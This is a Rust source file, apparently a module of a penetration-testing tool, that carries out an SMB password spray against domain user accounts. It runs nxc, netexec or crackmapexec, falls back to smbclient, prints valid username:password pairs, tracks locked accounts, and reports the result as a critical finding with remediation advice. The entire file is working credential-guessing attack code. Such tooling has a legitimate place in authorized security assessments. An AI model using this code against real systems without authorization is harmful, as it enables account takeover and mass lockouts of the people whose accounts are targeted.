use anyhow::Result;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::{sleep, timeout};

use crate::types::{Finding, ModuleResult, Severity, StageTimer};
use crate::ui;

/// Run SMB password spray against collected users.
pub async fn run(
    target: &str,
    domain: &str,
    passwords: &[String],
    collected_users: &[String],
    user_file: Option<&str>,
    max_users: usize,
    delay_ms: u64,
    non_interactive: bool,
) -> Result<ModuleResult> {
    ui::section("PASSWORD SPRAY");
    let timer = StageTimer::start();
    let mut result = ModuleResult::new("spray");

    // Build user list
    let mut users: Vec<String> = collected_users
        .iter()
        .filter(|u| !u.ends_with('$') && !u.eq_ignore_ascii_case("krbtgt"))
        .cloned()
        .collect();

    // Add from file
    if let Some(path) = user_file {
        if let Ok(content) = tokio::fs::read_to_string(path).await {
            let file_users: Vec<String> = content
                .lines()
                .filter(|l| !l.is_empty())
                .map(String::from)
                .collect();
            users.extend(file_users);
        }
    }

    // Deduplicate
    users.sort_by_key(|u| u.to_lowercase());
    users.dedup_by(|a, b| a.to_lowercase() == b.to_lowercase());

    if users.is_empty() {
        ui::warning("No users available for password spray");
        result = result.skipped("no users");
        return Ok(result);
    }

    // Limit users
    if users.len() > max_users {
        ui::warning(&format!(
            "Limiting spray to {} users (from {})",
            max_users,
            users.len()
        ));
        users.truncate(max_users);
    }

    if passwords.is_empty() {
        ui::warning("No passwords specified for spray");
        result = result.skipped("no passwords");
        return Ok(result);
    }

    if !non_interactive {
        let confirm = dialoguer::Confirm::new()
            .with_prompt(&format!(
                "  Spray {} password(s) against {} user(s)?",
                passwords.len(),
                users.len()
            ))
            .default(false)
            .interact_opt()
            .unwrap_or(Some(false))
            .unwrap_or(false);
        if !confirm {
            result = result.skipped("user declined");
            return Ok(result);
        }
    }

    let total = users.len() * passwords.len();
    let pb = ui::progress_bar(total as u64, "SPRAY");

    let mut valid_creds = Vec::new();
    let mut locked_accounts = Vec::new();

    for password in passwords {
        ui::info(&format!("Spraying password: {}", mask_password(password)));

        for user in &users {
            pb.inc(1);
            pb.set_message(format!("{}:{}", user, mask_password(password)));

            match try_smb_login(target, domain, user, password).await {
                LoginResult::Success => {
                    pb.println(format!("  [+] VALID: {}:{}", user, password));
                    valid_creds.push(format!("{}:{}", user, password));
                }
                LoginResult::Locked => {
                    pb.println(format!("  [!] LOCKED: {}", user));
                    locked_accounts.push(user.clone());
                }
                LoginResult::Invalid => {}
                LoginResult::Error(e) => {
                    pb.println(format!("  [-] ERROR for {}: {}", user, e));
                }
            }

            if delay_ms > 0 {
                sleep(Duration::from_millis(delay_ms)).await;
            }
        }
    }

    pb.finish_and_clear();

    // Report results
    if !valid_creds.is_empty() {
        ui::success(&format!("{} valid credential(s) found!", valid_creds.len()));
        for cred in &valid_creds {
            ui::kv("  Valid", cred);
        }
        let finding = Finding::new(
            "spray",
            "SPRAY-001",
            Severity::Critical,
            &format!("{} valid credentials via password spray", valid_creds.len()),
        )
        .with_description("Password spray attack discovered valid credentials")
        .with_evidence(&valid_creds.join("\n"))
        .with_recommendation("Enforce strong, unique passwords; implement account lockout policies; deploy MFA")
        .with_mitre("T1110.003");
        result.findings.push(finding);
    } else {
        ui::info("No valid credentials found");
    }

    if !locked_accounts.is_empty() {
        ui::warning(&format!("{} account(s) locked out", locked_accounts.len()));
    }

    ui::stage_done(
        "SPRAY",
        &format!("{} tested, {} valid", total, valid_creds.len()),
        &timer.elapsed_pretty(),
    );

    result = result.success(timer.elapsed());
    Ok(result)
}

// ── SMB login attempt ───────────────────────────────────────────────────────

enum LoginResult {
    Success,
    Invalid,
    Locked,
    Error(String),
}

async fn try_smb_login(target: &str, domain: &str, user: &str, password: &str) -> LoginResult {
    let tools = ["nxc", "netexec", "crackmapexec"];

    for tool in tools {
        let out = timeout(
            Duration::from_secs(10),
            Command::new(tool)
                .args([
                    "smb",
                    target,
                    "-d",
                    domain,
                    "-u",
                    user,
                    "-p",
                    password,
                ])
                .output(),
        )
        .await;

        match out {
            Ok(Ok(output)) => {
                let raw_stdout = String::from_utf8_lossy(&output.stdout);
                let raw_stderr = String::from_utf8_lossy(&output.stderr);
                ui::verbose_output(tool, &raw_stdout);
                ui::verbose_output(tool, &raw_stderr);
                let stdout = raw_stdout.to_lowercase();
                let stderr = raw_stderr.to_lowercase();
                let combined = format!("{}\n{}", stdout, stderr);

                if combined.contains("pwn3d") || combined.contains("[+]") && combined.contains(&user.to_lowercase()) {
                    return LoginResult::Success;
                } else if combined.contains("account_locked") || combined.contains("account_disabled") {
                    return LoginResult::Locked;
                } else {
                    return LoginResult::Invalid;
                }
            }
            Ok(Err(_)) => continue, // Tool not found
            Err(_) => return LoginResult::Error("timeout".to_string()),
        }
    }

    // Fallback: smbclient
    let user_arg = format!(
        "{}\\{}%{}",
        domain.split('.').next().unwrap_or(domain),
        user,
        password
    );
    let out = timeout(
        Duration::from_secs(10),
        Command::new("smbclient")
            .args(["-L", target, "-U", &user_arg])
            .output(),
    )
    .await;

    match out {
        Ok(Ok(output)) => {
            let combined = format!(
                "{}\n{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            )
            .to_lowercase();

            if combined.contains("sharename") || combined.contains("ipc$") {
                LoginResult::Success
            } else if combined.contains("account_locked") {
                LoginResult::Locked
            } else {
                LoginResult::Invalid
            }
        }
        _ => LoginResult::Error("no compatible tool".to_string()),
    }
}

fn mask_password(p: &str) -> String {
    if p.len() <= 2 {
        "*".repeat(p.len())
    } else {
        format!("{}{}{}",
            &p[..1],
            "*".repeat(p.len() - 2),
            &p[p.len()-1..]
        )
    }
}
